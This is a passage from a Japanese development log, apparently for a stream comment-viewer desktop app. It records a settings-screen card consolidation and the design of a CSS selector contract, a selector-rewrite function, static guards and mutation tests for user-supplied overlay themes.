漏れない」（`CommentViewerApp.notificationSound` 2 本）／投げ銭 `.note` の Q-3 文言（1 本）。

**書き換え 4 本**（仕様は生きていて手段だけ移ったもの）:
⚠ **fail-closed（試聴に失敗しても既定デバイスで鳴らし直さない）はテスト再生版から試聴版へ移しただけで
削っていない**（`docs/security.md` のレビュー必須条件に触れる担保なので減らさない）。ほかに
「選び直すと赤字が消える」「未選択のあいだは再生 command を呼ばない」「見つからないときは押せない」。

**新規 8 本**: テスト再生ボタンが存在しないこと／出力先の条件表示 4 本（両方 OFF で出ない・コメント音
ON で出る・**投げ銭音だけ ON でも出る**〔OR の両方向〕・トグルと試聴は消えない）／「配信に載る/載らない」
の説明がこのセクションにあること／試聴ボタンが同名 2 つであること／試聴の失敗表示（§9）。

⚠ **`openSettings()` 系ヘルパの前提が変わった**（出力先セクションが条件表示になったため）。
両方 OFF から始めるテストはセレクトを待てないので、`openSettingsView()`（トグルだけ待つ）を新設した。
`CommentViewerApp.audio.test.tsx` の `openSettings()` は**コメント音を ON にしてから render** する。

### 検証

`cargo check` ✅ ／ `cargo test` ✅ **157 passed** ／ `pnpm typecheck` ✅ ／ `pnpm lint` ✅ ／
`pnpm test` ✅ **775 passed / 38 files**（＋CSS guard OK ／ Version sync OK）。

**差分ゼロ**: `src-tauri/` 全体 ／ `capabilities/` ／ `tauri.conf.json` ／ `docs/security.md` ／
`CommentViewerApp.module.css`（**CSS 差分ゼロ**・既存クラスのみで組んだ）／ `Cargo.*` ／
`package.json` ／ `pnpm-lock.yaml` ／ `apps/comment-sidecar/`。

### ⚠ 実機確認は未実施（本人の手番）

059b の E2E 項目に加えて、059c で見るべきもの:
①**両方 OFF → 出力先が消える／ON → 出る**（片方ずつ両方向）
②試聴ボタンが**同名で 2 つ並んでも押し間違えないか**（本人決定の妥当性そのもの）
③**投げ銭音 OFF ＋ コメント音 ON でスパチャが無音**になるのを体感して、説明文なしで許容できるか（上記 ⚠）
④ライト/ダークで 1 枚になったカードが崩れないか（コントロールが 5 つ＝トグル 2＋試聴 2＋再読み込み 1）

### 059c(2) 追加の UI 再編 —— 「固定コメントをOBSに表示」カードを「OBSに表示」へ統合（2026-08-04・本人指示）

上の 059c（通知音カードの統合）に続く**同種の指示**。「固定コメントをOBSに表示もコメントをOBSに表示と
同じカード内にまとめてほしい」に対応した。**設定画面の構造変更のみ**で、オーバーレイ窓の開閉ロジック・
永続化・OBS 連携（044a/046d）には一切触れていない。

#### 変更

- **046b の独立カード（`.card` ＋ `.cardHead`「固定コメントをOBSに表示」）を廃止**し、中身を
  「コメントをOBSに表示」カードの `.cardBody` **末尾**へ移した（フォント／サイト名表示の後ろ）。
- **カード見出しを「コメントをOBSに表示」→「OBSに表示」へ改名**（本人決定）。
- ⚠ **要素の順序・内容は 1 つも変えていない**（枠を外して中身を移しただけ）。そのおかげで
  「上の『OBSに自動で反映する』がONなら…」「上のコメント用と同じく…」「フォントとサイト名表示は、
  **上の設定**が…」の 3 本が**すべて参照が成立したまま**＝可視文言の書き換えはゼロ。
  **⚠ この 3 本より前に要素を挿入するときは「上の」が指す先が変わらないか必ず確認すること。**
- 設定ビューのカードは **読み上げ（VOICEVOX） / 通知音 / OBSに表示** の 3 枚になった。

#### 見出し改名で解消した既知問題（副産物）

045b でトグルがツールバーへ出ていって以降、見出し「コメントをOBSに表示」は
**そのカードに無いコントロール名**を指していた（旧レビューが「修正不要・再修正トリガー＝次に文言タスクを
起票するとき」として残していた既知問題）。固定コメントを吸収すると中身の一部しか表さなくなるため、
このタイミングで解消した。**見出しとツールバーのトグル label の同一文字列衝突も同時に消えた**が、
⚠ `CommentViewerApp.toolbar.test.tsx` / `SettingsView.obs.test.tsx` の `role="switch"` 絞り込みは**残してある**
（外すと再発時に気付けない）。045a の「可視文言から『オーバーレイ』を消す」方針とも整合する
（「OBSオーバーレイ」は採らなかった）。

#### ⚠ 失効した記述

| どこ | 旧記述 | 現在の正 |
| --- | --- | --- |
| `docs/tasks/046b` ／ task-board | 「固定コメント用に**別カード**を新設し、上の OBS カードの隣に置く」 | カードは廃止。「OBSに表示」カード内の**末尾セクション**になった |
| `SettingsView.tsx`（旧コメント） | 「見出しとトグル label が同一文字列で、テストが `role="switch"` 絞りを強いられる」 | 見出しが「OBSに表示」になり衝突は解消（絞り込みは保険として残置） |
| `SettingsView.tsx`（旧コメント） | 「見出しと中身のずれ…再修正トリガー＝次に文言タスクを起票するとき」 | **トリガー発火・解消済み** |

⚠ 手動キャプチャ手順が固定側にだけ在りコメント側に無い**非対称は統合後も残っている**（054 追補で
コメント側から削除されたまま・承知の上）。再修正トリガー＝2 つの案内粒度を揃える文言タスクを起票するとき。

#### テスト

`SettingsView.obs.test.tsx` に **1 本追加**（`⚠ 059c(2): 固定コメントの設定は独立カードではなく
「OBSに表示」カードの中にある`）。①`cardHead` の集合が「OBSに表示」だけで旧 2 見出しを含まないこと
②固定トグルと自動反映トグルが **`closest('[class*="card"]')` で同一カードに属すること**を見る。
⚠ **見出しの数まで見るのは、「カード枠だけ残して見出しを消す」中途半端な状態を弾くため。**
**ミューテーション（固定ブロックを再び別カードへ分割）でこの 1 本だけがレッドになることを実測。**
既存の 046b テスト群は `role="switch"` とテキストで引いているため**アサート無改変で通る**
（describe 名と docstring のみ追随）。

#### 検証

`cargo check` ✅ ／ `cargo test` ✅ **157 passed** ／ `typecheck` ✅ ／ `lint` ✅ ／
`test` ✅ **776 passed / 38 files**（＋CSS guard OK ／ Version sync OK）。
**差分ゼロ**: `CommentViewerApp.tsx` ／ `src-tauri/` 全体 ／ `docs/security.md` ／
`CommentViewerApp.module.css`（**CSS 差分ゼロ**）／依存一式。

#### ⚠ 実機確認の追加項目

⑤ 3 枚になったカード（読み上げ／通知音／OBSに表示）の並びと、**「OBSに表示」カードが長くなりすぎて
いないか**（トグル 3・セレクト 1・入力 1・注記多数）。分割し直したくなったら、切り口は
「OBS 接続のセットアップ」と「オーバーレイの中身と見た目」になる。

## 060a オーバーレイのセレクタ契約＋セレクタ変換表（2026-08-04）

親 [060](tasks/060-overlay-custom-css.md) の 1 本目。ユーザーが持ち込むカスタム CSS が**狙える的**を作った。
**既存の意匠は 1px も変えていない**（DOM に属性とクラスを足し、直値を変数参照へ置き換えただけ）。
frontend のみ・**新規依存ゼロ**・**新規 capability ゼロ**・`csp: null` 不変・Rust / sidecar は差分ゼロ。

### (1) 安定クラス（`sd-*`）—— 契約表

CSS Modules のハッシュ名と**併記**する素の文字列クラス。⚠ **chat と課金で「同じ役割」には同じクラス**
（既存 CSS Modules 名の機械的な写像にはしていない。ユーザーは内部の分岐を知らない）。

| 安定クラス | chat 分岐 | 課金分岐 |
| --- | --- | --- |
| `sd-overlay` | `OverlayApp.module.css` の `.root`（**`OverlayApp.tsx` のみ**） | — |
| `sd-comment` | `overlayStyles.item` | `overlayStyles.item` |
| `sd-comment-tip` | — | `overlayStyles.card` |
| `sd-comment-name` | `overlayStyles.name` | `overlayStyles.cardName` |
| `sd-comment-source` | `overlayStyles.source` | `overlayStyles.source` |
| `sd-comment-icon` | `overlayStyles.icon` | `overlayStyles.icon`（共有の `icon` 変数） |
| `sd-comment-body` | `overlayStyles.bubble` | `overlayStyles.cardBody` |
| `sd-comment-text` | `overlayStyles.text` | `overlayStyles.cardText` |
| `sd-comment-amount` | — | `overlayStyles.amountBadge` |
| `sd-comment-event` | — | `overlayStyles.eventMessage` |

⚠ **足さなかったもの**: `sd-comment-header`（名前行／ヘッダ帯・本人判断で不採用）／`overlayStyles.row`
（`--sd-icon-gap` で足りる）／`overlayStyles.iconFallback`（`.sd-comment-icon > span` で狙える）。
要望が来たら足す（`unmatched` と同じ**要望駆動**の拡張）。
⚠ `.empty`（「コメントはまだありません」）は `CommentViewerApp.module.css` 由来で**安定クラスが付かない**
＝ユーザー CSS からは隠せない。**060d への申し送り**。

### (2) data 属性

| 属性 | 値 | 付ける先 |
| --- | --- | --- |
| `data-sd-source` | `c.source`（`"youtube"` / `"twitch"`） | 全コメント |
| `data-sd-event` | `displayEventType(c)`（表示分岐と同じ判定） | 全コメント |
| `data-sd-tone` | `monetaryTone(c)`（13 種） | **課金分岐のみ** |

- ⚠ **`data-sd-event` はビッツで `"bits"` になる**（`eventType="superchat"` ＋ `currency="BITS"` の振り替え）。
  **CSS 契約では表示と一致しているのが正しい**（059b の「音の課金判定」とは目的が違うので結論を持ち込まない）。テストで固定。
- ⚠ **`data-sd-tone` を chat に付けなかった**（タスクファイルは全件に付ける読みだったが本人決定で変更）。
  `monetaryTone()` は chat を **`"t0"` へ無害劣化**させるので、付けると「最低額スパチャだけ光らせる」
  （`[data-sd-tone="t0"]`）と書いたユーザー CSS が**全 chat にも当たる**。chat / 課金の区別は
  `data-sd-event` と `.sd-comment-tip` の両方で既に付いている。

### (3) CSS 変数（9 個）と当て先 —— **`.root` には 1 つも「定義」しない**

⚠⚠ **最大の設計判断**。`.root` に既定値を定義する方式は**成立しない**——`--sd-comment-radius` の当て先は
`.bubble`（14px）と `.card`（12px）で**既定値が違う**（043c の意図的な意匠差）ため、`.root` に 1 つ置くと
片方の実値が動く＝「1px も変えない」に反する。
→ **既定値は必ず `var(--sd-X, 現行値)` のフォールバック側**に置く（フォールバックが唯一の真実）。
副産物として ①060d のプレビュー（`.sd-preview` 配下＝`.root` の外）でも意匠が保たれる
②`OverlayApp.module.css` が**差分ゼロ**＝固定コメント窓への波及もゼロ
③「定義したが誰も読んでいない変数」が**構造的に起こりえない**。

| 変数 | 当て先（すべて `OverlayComment.module.css`） | フォールバック＝現行値 |
| --- | --- | --- |
| `--sd-comment-bg` | `.bubble{background}` ＋ `.bubble::after{border-right-color}` | `var(--overlay-bubble-bg)` |
| `--sd-comment-border` | `.bubble{border}` ＋ `.bubble::before{border-right-color}` | `var(--overlay-bubble-border)` |
| `--sd-comment-fg` | `.text{color}` ＋ `.cardBody{color}` | `var(--overlay-body-fg)` |
| `--sd-comment-radius` | `.bubble{border-radius}` / `.card{border-radius}` | **14px / 12px（当て先ごとに別）** |
| `--sd-comment-gap` | `.item{margin-block}`（**新設**） | `0px` |
| `--sd-name-fg` | `.name{color}` | `var(--overlay-name-fg)` |
| `--sd-name-outline` | `.name{text-shadow}` の **5 箇所** | `var(--overlay-outline)` |
| `--sd-icon-size` | `.item{--icon-size}` | `44px` |
| `--sd-icon-gap` | `.item{--icon-gap}` | `28px` |

**採否の基準**: 安定クラスで直接書ける値（`font-size` 等）は変数にしない。**複数箇所が連動しないと壊れる値だけ**。
`bg`/`border` はしっぽ（擬似要素）が、`outline` は 5 層が、`icon-size`/`icon-gap` は `.header` のインデント
（`calc(var(--icon-size) + var(--icon-gap))`）が連動する。タスクファイルの 6 個に **3 個を追加**した
（`--sd-comment-border` / `--sd-name-outline` / `--sd-icon-gap`）。

**当て先の判断（タスクファイルに書かれていなかった前提への回答）**

- ⚠ **`--sd-comment-bg` は chat の吹き出しだけ。** 課金カードの背景（`--tone-bg` / `--tone-body`）に当てると
  **ティア 13 色が 1 変数で同色に潰れて「額が色で分かる」（043c/047b の情報設計）が消える**。
  ティアごとに変えたいユーザーは **`.sd-comment[data-sd-tone="t6"] .sd-comment-body { … }`** で狙う
  ＝ **1 変数で潰すより属性セレクタのほうが表現力が高い**（これが `data-sd-tone` を出した理由でもある）。
- ⚠ **`--sd-name-fg` は chat の `.name` だけ。** 課金の `.cardName` は `color: inherit` でティア帯の
  `--tone-fg`（明るいティアは暗文字）を継いでおり、上書きすると**ティアによって名前が読めなくなる**。
  課金側は `.sd-comment-tip .sd-comment-name { … }` で狙える。
- ⚠ **`--sd-comment-gap` は `.item` の `margin-block`（新設・既定 0px）。**
  ①共有 `.list`（`CommentViewerApp.module.css`・`gap: 6px`）は**本体コメビュと共有**なので触れない（035b の前例）
  ②`.card` が打ち消すのは `padding` / `gap` **だけ**なので、padding 側に載せると **chat だけ効いて課金カードは効かない**。
  margin なら **chat と課金の両方に対称に効く**。既定 0px（`li` の UA 既定 margin と同値）で意匠不変。
- ⚠ **`.item` のローカル変数は自分自身が宣言している**ので、`.root` に `--sd-icon-size` を置いても勝てない。
  `--icon-size: var(--sd-icon-size, 44px)` と**既定値側を読み替える**形にした。
- ⚠ **既知の制限**: 吹き出しのしっぽ（`::before`/`::after`）は `--sd-comment-radius` に**追随しない**
  （角丸を大きくすると継ぎ目がずれる）。再修正トリガー＝角丸を大きくしたテーマで見た目が破綻したら位置も変数化する。

### (4) 固定コメントオーバーレイ窓（`PinnedOverlayApp`）の扱い

⚠ **タスクファイルに書かれていなかった前提**: `PinnedOverlayApp`（046b）は `CommentList variant="overlay"` と
`OverlayApp.module.css` の `.root` を**そのまま共有**しているので、`renderOverlayItem` への追加は自動的に出る。

| 対象 | 判断 | 理由 |
| --- | --- | --- |
| 安定クラス・data 属性 | **出す**（分けない） | 分けるには共有コンポーネントに prop と分岐が要る。**注入経路が無い限り無害**（クラスは付くだけの死んだ文字列）。将来 046d のように広げるとき DOM 側は用意済みになる |
| `sd-overlay` | **`OverlayApp.tsx` にだけ付ける**（`PinnedOverlayApp.tsx` は**差分ゼロ**） | ①060d の「注入先は `comment-overlay` のみ」と**構造で一致**させる ②⚠ **046c の `applyFitScale` が `.root` の `transform`/`width`/`height` を排他所有**しているので、そこをユーザー CSS に触らせる的を作らない（縮小フィットが壊れる） |
| CSS 変数 | `.root` に定義しないので**波及そのものが無い** | 固定窓は現行値のまま。上書きする経路（`.sd-overlay` セレクタ／注入先）が存在しない |

**静的ガード (10-d) が両方向を固定**している（`OverlayApp.tsx` に**在る**こと／`PinnedOverlayApp.tsx` に**無い**こと）。

### (5) `features/comment-viewer/cssCompat.ts`（新規・純関数・**誰も呼ばない**）

`rewriteSelectors(css) → { css, rewritten, unmatched }`。**CSS の完全パースはしない**（新規依存ゼロ）。

⚠⚠ **呼び出し元はタスクファイルの記述（060b が取り込み時に適用）ではなく 060d（注入時に毎回）。**
060b が「**セレクタ変換はここでは行わない／保存するのは変換前の CSS／変換は注入時に frontend が毎回行う**」
（変換表の更新が取り込み済みテーマにも効くようにするため）と決めており、060d / task-board もそちらで揃っている。
060a の目的行と親 060 (2) の「取り込み時に」が**古い記述**——タスクファイルを訂正済み。
→ **帰結**: 注入とプレビュー表示のたびに毎回走るので、**決定性**と**冪等性**が機能要件になる
（**タスクファイル未記載だが必須**。テストとガード (10-c) の両方で固定した）。

**戻り値の定義**

- `rewritten` = **ルール単位**（`{ … }` 1 つにつき最大 1 件。1 ルールに 3 箇所の置換があっても 1）。
  060d の UI 文言「M 個のルールを StreamDock 用に変換しました」に**そのまま**落ちる粒度。
- `unmatched` = 変換後もなお残っている**純正チャット由来のセレクタトークン**（重複排除・出現順）。
  ⚠ 「sd 語彙でない全セレクタ」は**採らなかった**——`body` / `@media` / 擬似クラスが大量に載って
  **ユーザーが自分で sd 語彙に沿って書いた CSS でも警告だらけになり、警告が意味を失う**。
  判定は接頭辞ベース（`yt-` / `ytd-` / `.chat-` / `.tw-` / `.video-chat` / `[data-a-target`）。
  ⚠ **裸の id（`#message` / `#img`）は入れない**（ユーザー自身の id と区別できず、誤検知が警告を殺す）。
  ⚠ **`unmatched.length` は「種類数」であってルール数ではない**——**060d への申し送り**（UI 文言は「K 種類」に）。

**置換の安全性（パーサを持たない以上ここが品質の全部）**

- **走査型スキャナ**でセレクタ（プレリュード）の位置だけを列挙する。コメント・文字列は**中身を一切見ずに素通り**し、
  `{` の中身は「宣言」として素通り、**グループ規則（`@media`/`@supports`/`@container`/`@layer`/`@scope`/`@document`）の中だけ**
  走査を続ける。→ **宣言部・文字列・`url()` の中身・`@import` の URL に触る経路が構造上存在しない**
  ＝060b / 060c との責務分離が**祈りではなく構造**で成立する。
  ⚠ `check-css-guards.mjs` (6-b) の素朴な「ブレースを跨げない正規表現」方式は**採らなかった**
  （`content: "}"` や `}` を含むコメントで分割が壊れ、以降の全セレクタを取り違えるため。テストで固定）。
  ⚠ `@font-face` / `@keyframes` の中身（`from` / `to`）は宣言扱い＝セレクタとして誤認しない。
  ⚠ **CSS Nesting（`&`）は非対応**（変換されないだけで壊れはしない）。
- **長い順ソート**（`from` の文字数降順）。`yt-live-chat-text-message-renderer` を先に当てると
  `… #message` が `.sd-comment #message` に化ける。
  ⚠ **変換表は意図的に「長さ順に並べていない」**——定義順が既に長さ順だと、ソートを外す変異が
  **テストで殺せなくなる**（実測で生存した）。表を並べ替えるときも長さ順にしないこと。
- **単語境界**は lookaround。後ろは常に `(?![A-Za-z0-9_-])`（`.chat-line__no-background2` を巻き込まない）。
  前は `from` の形で出し分け——`.`/`#` 始まりは `(?<!\\)` だけ（`.foo.chat-line__message` の**複合は当てたい**）、
  要素名始まりは `(?<![A-Za-z0-9_.#-])`（`.my-yt-live-chat-x` に当てない）。
- **空白は `\s+` と `>` の両方を許す**（`renderer #message` / `renderer > #message`）。兄弟結合子は意味が変わるので許さない。
- ⚠ **単独の `#img` / `#message` / `#author-name` は変換表に入れない**（ユーザー自身の id を壊しうる）。
  **祖先付きの形だけ**。`yt-img-shadow` は `yt-` 接頭辞があるので単独でも安全。
- 変換表は **`{ from, to, why }` のデータ**（`SELECTOR_TABLE`）で持ち、実装・テスト・静的ガードが**同じ 1 つの表**を読む。

### (6) 静的ガード `check-css-guards.mjs` (10) —— テストでは守れない層

役割分担は (9) 冒頭が確立した形と同じ。**ランタイムのテスト**が「DOM に付くこと」を殺し（安定クラスは
CSS モジュールではなく**素の文字列**なので `querySelector` が実効的に効く＝(5)(6) のような
「原理的に守れない」状況ではない）、**ガード (10)** が ①3 ファイルにまたがる対応表の整合
②jsdom が一切解決しない CSS の実値、を守る。

| 検査 | 内容 |
| --- | --- |
| (10-a) | 安定クラス契約（`STABLE_CLASSES` 9 件）が `CommentList.tsx` に実在する |
| (10-b) | 変換表の `to:` 右辺 ⊆ 安定クラス契約（(4) の tone 表と同型の突き合わせ）＋**抽出 0 件なら fail**（空振りを緑にしない） |
| (10-c) | 変換表の `from:` 左辺に `sd-` が**無い**＝冪等性の構造的担保 |
| (10-d) | `sd-overlay` が `OverlayApp.tsx` に**在り**、`PinnedOverlayApp.tsx` に**無い** |
| (10-e) | CSS 変数の 12 宣言が `var(--sd-X, 現行値)` と**厳密一致**（(7-b) の `EXPECTED_PULL` と同型）。**「1px も変えない」と「誰も読まない変数を作らない」を同時に守る唯一の手段** |
| (10-f) | `.name` の `text-shadow` が `var(--sd-name-outline` を **5 箇所**参照している |

- ⚠ **契約の一覧をガードに置いた理由**: 安定クラスは**ユーザーの CSS との契約**であって内部名ではない。
  リネームすると StreamDock 側はテストを一緒に書き換えれば緑のまま通るが、**ユーザーのテーマは全部壊れる**。
  一覧をここに置けば、変更が必ず**このファイルの diff に現れる**（(6-b) の `FAINT_ALLOWED` と同じ作法）。
- ⚠ **`.bubble::after` の取り出しは「セレクタで始まる**すべての**ルール」を見る形**にした。
  `.bubble::before, .bubble::after { … }` の束ねと単独ルールの 2 つに分かれており、
  先頭 1 つだけを見る `ruleBody` では束ねを掴んで**正しい CSS で落ちる**（(5-b) が戒めた失敗と同型）。
- ⚠ **ガードにしなかったもの**: 「`cssCompat` の import 元がテスト以外に存在しない」検査。
  060b / 060d が来た瞬間に**正しいコードで落ちる**。下記の記録と JSDoc に留めた。

### (7) ⚠ 060a 単体でコミットできるが、060b とセットで完成させること

- **060a 時点で CSS を注入する経路は存在しない**（実測: `apps/desktop/src` に `<style>` を生成する箇所ゼロ・
  `insertRule` ゼロ・`dangerouslySetInnerHTML` ゼロ〔ヒットはすべてコメントとテストのアサーション〕・
  `cssCompat` の import 元は `cssCompat.test.ts` のみ）。
  したがって `.sd-comment-icon { background-image: url(…) }` で**外部画像を差す経路もまだ開いていない**。
- ⚠⚠ **この経路は 060d が注入を実装した瞬間に開く。** 060a は**契約＝経路を作る側**なので、
  塞ぐ側の **060b の `url()` / `@import` 除去とセットで完成させること**。
  **060b より先に 060d を実装してはならない**（親 060 の実装順 060a → 060b → 060d → 060c を守る）。
  同じ内容を `cssCompat.ts` 冒頭 JSDoc にも再修正トリガー付きで書いた。

### 実サンプル CSS での検証（2026-08-04 受領・実測済み）

依頼者から YouTube 用 / Twitch 用の実サンプルを受領し、**逐語で `cssCompat.test.ts` のフィクスチャに入れた**。
⚠ 第三者資産の扱い: 意匠の実体である `ruri.info` の CSS は**リポジトリに一切コピーしていない**（URL のみ・
URL は元から docs/060c に記載済み）。フィクスチャに入れたのは**依頼者自身が書いた 6 行の設定**
（書体の指定と `--txtcolor`）だけ。

**実測結果（両方とも変換成功・未変換ゼロ・冪等）**

| サンプル | `rewritten` | `unmatched` | 冪等 |
| --- | --- | --- | --- |
| YouTube | **1**（カンマ束ねの 2 パートで 1 ルール） | **`[]`** | ✅ 2 周目 `rewritten=0`・出力同一 |
| Twitch | **1** | **`[]`** | ✅ 同上 |

```
yt-live-chat-text-message-renderer #message,      →  .sd-comment-text,
yt-live-chat-text-message-renderer #message *     →  .sd-comment-text *
.chat-line__no-background                         →  .sd-comment
@import url("https://ruri.info/…Comment.css");    →  無改変（060b / 060c の責務）
:root{ --txtcolor:#555555; }                      →  無改変・unmatched にも載らない
```

**実サンプルが裏付けた設計判断**

- ⚠ **`unmatched` を「接頭辞ベース」にした判断が実サンプルで正しさを示した。** 当初案の「sd 語彙でない
  全セレクタを載せる」方式だったら、**実サンプルの時点で既に `:root` が警告に載っていた**
  （＝ユーザーが 1 本目を入れた瞬間に警告がノイズだと学習してしまう）。
- **子孫の `*`（`… #message *`）が正しく `.sd-comment-text *` になる。** 祖先付きエントリの後ろに
  残った部分がそのまま生きる形＝長い順ソートと単語境界が実サンプルで効いていることの確認。
- **実サンプルそのものが「長い順ソートを外す」変異を殺す**ようになった（実測: 5 テストがレッド）。
  想定形フィクスチャだけのときより実効性が上がっている。
- 変換表のうち実サンプルが使うのは **2 エントリだけ**（`… #message` と `.chat-line__no-background`）。
  残りは `*_EXTENDED`（想定形）でカバーしている。

### ⚠⚠ 実サンプルが暴いた、より重要な事実 —— **060c が「あれば嬉しい」ではなく payload そのもの**

**実サンプル 2 本には意匠がほとんど入っていない。** 中身は ①外部 `@import` 1 行 ②書体の指定
③その外部 CSS が読む `--txtcolor` の 3 つだけで、**吹き出しのデザインは丸ごと外部 CSS の中**にある。

| どこまで作ると、この依頼者のサンプルはどうなるか | 結果 |
| --- | --- |
| 060a のみ（現状） | 注入経路が無いので**何も起きない**（契約と変換表が置かれただけ） |
| ＋060b（`@import` を除去して保存） | **書体しか効かない。** `--txtcolor` は読み手が消えて無意味になる |
| ＋060d（注入・切替 UI） | 同上。**「入れたのに見た目がほぼ変わらない」** |
| ＋060c（外部 `@import` のスナップショット） | ここで**初めて吹き出しの意匠が出る** |

- ⚠ **したがって「060c は実装しない判断も最後まで残る」（task-board）を選ぶと、この依頼者の手持ちの
  CSS は事実上使えない。** 060c の要否判断は「060b+060d の実機の手応えを見てから」（親 060 の実装順の意図）
  だが、**その手応えは『書体だけ変わる』になることが今の時点で分かっている**。判断材料として先に記録しておく。
- ⚠ **「セレクタ契約が実用に足るか」という 060 の中心的な問いは、まだ答えが出ていない。**
  実サンプルが通ることは確認できたが、**意匠を作っている本体のセレクタ（外部 CSS の中身）を見ていない**ため。
  変換表の十分性は 060c で外部 CSS を取り込んだ時点で再評価する（取り込んだ内容にも注入時の変換が走るので、
  そこで `unmatched` が観測手段として効く＝アーキテクチャ自体は正しく機能する）。
- 外部 URL は `midashi1Comment.css` / `twmidashi1Comment.css` で、**060c が例示している
  `fukidashiComment.css` とは別ファイル**（同一サイト）。依頼者は複数の意匠を持ちうる
  ＝**060c の「宛先を allow-list で固定できない」という前提はいっそう確か**。

### ⚠ 060d への追加の申し送り（実サンプルから判明）—— `scopeSelectors` は `:root` を素通しできない

実サンプルは **`:root { --txtcolor: … }` を含む**。060d のプレビューは全セレクタへ `.sd-preview` を
前置する設計なので、素朴に前置すると **`.sd-preview :root` になって絶対に当たらない**
（`:root` は `<html>` で、プレビューのラッパの祖先にあたるため）。
→ **プレビューでだけ色が反映されない**という、原因の分かりにくい不一致になる。
`scopeSelectors` は `:root` / `html` / `body` を**前置ではなくラッパ自身（`.sd-preview`）へ読み替える**
必要がある。⚠ オーバーレイ窓への注入では前置しないので、この問題は**プレビュー限定**。

### テスト

- **`cssCompat.test.ts`（新規・25 件）**: **実サンプル 2 本**の変換（出力全文を厳密一致で固定）／
  想定形 2 本で変換表の残りのエントリ／未知セレクタが**残って** `unmatched` に載る／
  **`@import` と `url()` を触らない**／`rewritten` がルール単位／**冪等**（2 回通して同一）／
  長短の優先順（`>` 結合子含む）／単語境界（`…background2` を巻き込まない・複合は当てる）／
  **宣言部の文字列とコメントを壊さない**（`content: "}"` でブロック分割が壊れないことを含む）／
  `@media` の中は変換し `@keyframes` / `@font-face` は触らない／
  **sd 語彙で書かれた CSS で `unmatched` が空**（警告がノイズに埋もれない）／異常系で throw しない。
- **`CommentList.test.tsx` に 8 件追加**: chat / 課金の安定クラス（**同じ役割は同名**）・`showSource` の有無・
  `data-sd-source` / `data-sd-event`（**ビッツで `"bits"`**）/ `data-sd-tone`（**chat には属性ごと無い**）・
  **`variant="default"` には 1 つも付かない**（本体への非波及）。
- **既存の意匠テストは 1 本も落ちていない**（見た目不変の担保）。

### ミューテーション（14 種で実効性を実測）

| 変異 | ガード | テスト |
| --- | --- | --- |
| chat 分岐の `sd-comment-text` を外す | 緑（既知の限界） | **レッド** |
| `sd-comment-text` を両分岐とも／`sd-comment-amount`（1 箇所）／素の `sd-comment` だけを外す | **レッド** | **レッド** |
| 変換表の `to` を実在しないクラスへ | **レッド** | — |
| 変換表の `from` に sd 語彙を書く | **レッド** | **レッド** |
| 長い順ソートを外す | — | **レッド** |
| 単語境界の lookahead を外す | — | **レッド** |
| `data-sd-event` を `c.eventType` にする | — | **レッド** |
| `sd-overlay` を `OverlayApp` から外す／`PinnedOverlayApp` に付ける | **レッド** | — |
| `.bubble{background}` を直値へ戻す／`--icon-size` を直値へ／`margin-block` を削除 | **レッド** | — |
| `.card` の角丸を 12px→14px（**意匠変更**）／`text-shadow` 1 層だけ直値へ | **レッド** | — |

⚠ **実装中にミューテーションが暴いた自分の欠陥 2 件を修正した**（どちらも「検査が空振り」の型）:

1. **長い順ソートが実質空振りだった** —— 変換表の定義順がたまたま長い順で、`.sort()` を消しても
   全テストが緑だった。**表を意図的に「総論→各論」（＝長さ順でない）並びに変更**し、理由をコメントに明記。
2. **ガード (10-a) の単語境界が `\b` で緩かった** —— `-` は非単語文字なので `\bsd-comment\b` が
   **`sd-comment-tip` の中にも一致**し、素の `sd-comment` を外す変異が生存した。
   `(?<![A-Za-z0-9_-])…(?![A-Za-z0-9_-])` に変更（`cssCompat.ts` の置換と同じ手法）。

⚠ **残る既知の限界**: (10-a) は「ファイルから名前が消えていないこと」しか見ない（(9-c) と同型）。
**同じクラスが 2 箇所にあるとき片方だけ外す変異は生存する**——それは `CommentList.test.tsx` が殺す
（実測でレッドを確認）。**ランタイム側のテストを「どうせ静的ガードがあるから」と消さないこと。**

### 検証

`typecheck` ✅ ／ `lint` ✅ ／ `test` ✅ **807 passed / 39 files**（＋CSS guard OK ／ Version sync OK）。
**差分ゼロ**: `apps/desktop/src-tauri/` ／ `apps/comment-sidecar/` ／ `.github/` ／
`package.json`・`pnpm-lock.yaml`（**新規依存ゼロ**）／`CommentViewerApp.module.css`（**本体 UI 非波及**）／
`OverlayApp.module.css`（変数を定義しない方式の帰結）／`PinnedOverlayApp.tsx` ／
**`viewerFormat.ts`（036a の data URI ガード無改変）** ／ `monetaryTone.ts` ／ `docs/security.md`。

**軽レビュー実施済み（2026-08-04・修正必須 0 件）**。観点に「036a の data URI ガードに触れていない」
「既存意匠の実値が変わっていない」を明示的に含めた。前者は `viewerFormat.ts` の差分ゼロと
`renderOverlayItem` の `style` プロップが完全同一であることで確認。後者は 13 宣言のフォールバックが
すべて現行値であること＋ガード (10-e)(10-f) が機械で固定していることで確認。**生 hex の新規追加ゼロ**。

### ⚠ 実機確認は未実施（本人の手番）

1. オーバーレイ窓（`comment-overlay`）の DevTools で、ルートに `sd-overlay`、chat の `<li>` に
   `sd-comment` / `data-sd-source` / `data-sd-event="chat"` が付き **`data-sd-tone` が無い**こと。
   課金の `<li>` に `sd-comment sd-comment-tip` / `data-sd-tone="t3"` 等。**ビッツで `data-sd-event="bits"`**。
2. **変数が実際に読まれていること**（コンソールで 9 変数すべて）:
   ```js
   const r = document.querySelector('.sd-overlay');
   r.style.setProperty('--sd-comment-bg', 'red');       // 吹き出し**としっぽ**が赤
   r.style.setProperty('--sd-comment-border', 'lime');  // 枠**としっぽの縁**が緑
   r.style.setProperty('--sd-comment-fg', 'blue');      // chat 本文と課金カード本文
   r.style.setProperty('--sd-comment-radius', '0px');   // 吹き出しと課金カードの角
   r.style.setProperty('--sd-comment-gap', '20px');     // コメント間（課金カードも同じだけ）
   // ⚠ 実距離は 6px（.list の gap）＋ 2×20px = 46px。margin-block は上下**両方**に効き、
   //    flex アイテム同士の margin は相殺されないため（060a レビュー Q-3）。
   r.style.setProperty('--sd-name-fg', 'magenta');      // chat の名前（課金の名前は不変＝仕様）
   r.style.setProperty('--sd-name-outline', 'black');   // 名前の縁取り
   r.style.setProperty('--sd-icon-size', '80px');       // アイコン＋**名前行のインデントも追随**
   r.style.setProperty('--sd-icon-gap', '4px');         // 間隔＋**名前行のインデントも追随**
   ```
   ⚠ リロードで元に戻すと実装前と同じ見た目になること。
3. **見た目が実装前と完全に同じ**であること（chat / スパチャ / サブスク の 3 種で比較）。
4. **固定コメントオーバーレイ窓（`pinned-overlay`）**: DOM に `sd-comment` / `data-sd-*` は**出る**が
